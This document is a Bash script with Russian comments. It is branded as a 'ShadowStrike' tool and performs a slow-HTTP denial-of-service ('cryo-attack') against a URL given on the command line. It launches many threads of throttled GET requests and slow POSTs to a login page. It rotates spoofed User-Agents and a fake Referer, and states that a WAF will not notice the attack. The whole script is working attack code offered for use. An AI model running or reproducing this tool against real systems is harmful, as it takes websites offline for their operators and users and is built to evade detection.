#!/bin/bash
# АБСОЛЮТНЫЙ НОЛЬ — Крио-атака через тайминг
# Не ломаем сервер, а замораживаем его во времени

TARGET=$1
THREADS=${2:-20}
DURATION=${3:-300}

[ -z "$TARGET" ] && echo "Usage: $0 http://target.com [threads] [duration_sec]" && exit 1

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — ABSOLUTE ZERO              ║"
echo "║   Крио-атака: заморозка сервера во времени  ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "[ZERO] Цель: $TARGET"
echo "[ZERO] Потоков: $THREADS"
echo "[ZERO] Длительность: ${DURATION}s"
echo ""

# База легитимных User-Agent'ов
UA_LIST=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0.0.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) Safari/605.1.15"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1) AppleWebKit/605.1.15"
    "Mozilla/5.0 (Linux; Android 14) Chrome/131.0.6778.135"
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101"
)

# База легитимных URL для медленных запросов
PAGES=(
    "/" "/about" "/contact" "/login" "/search"
    "/api/docs" "/api/status" "/api/health"
    "/assets/js/app.js" "/assets/css/style.css"
    "/images/logo.png" "/favicon.ico"
    "/robots.txt" "/sitemap.xml"
)

echo "[ZERO] Запускаю крио-потоки..."

# Функция одного крио-потока
cryo_thread() {
    local id=$1
    local target=$2
    local end_time=$(($(date +%s) + DURATION))
    
    while [ $(date +%s) -lt $end_time ]; do
        UA="${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}"
        PAGE="${PAGES[$((RANDOM % ${#PAGES[@]}))]}"
        
        # Slow HTTP: читаем по 1 байту в секунду
        curl -sk --max-time 120 \
            --limit-rate 10 \
            -A "$UA" \
            -H "Accept: text/html,application/xhtml+xml" \
            -H "Accept-Language: en-US,en;q=0.9" \
            -H "Referer: https://www.google.com/" \
            -H "Cache-Control: max-age=0" \
            "$target$PAGE" -o /dev/null 2>/dev/null &
        
        # Slow POST: отправляем по 1 байту
        curl -sk --max-time 120 \
            --limit-rate 5 \
            -A "$UA" \
            -X POST \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "data=$(python3 -c 'print(\"A\"*1000)')" \
            "$target/login" -o /dev/null 2>/dev/null &
        
        sleep 0.5
    done
}

# Запускаем потоки
for i in $(seq 1 $THREADS); do
    cryo_thread "$i" "$TARGET" &
    echo "  ❄️ Поток $i запущен"
done

echo ""
echo "[ZERO] $THREADS крио-потоков активны"
echo "[ZERO] Сервер замораживается..."
echo "[ZERO] WAF не видит атаки — это просто медленные пользователи"

wait
echo ""
echo "[ZERO] ❄️ АБСОЛЮТНЫЙ НОЛЬ достигнут"
echo "[ZERO] Сервер заморожен на ${DURATION} секунд"
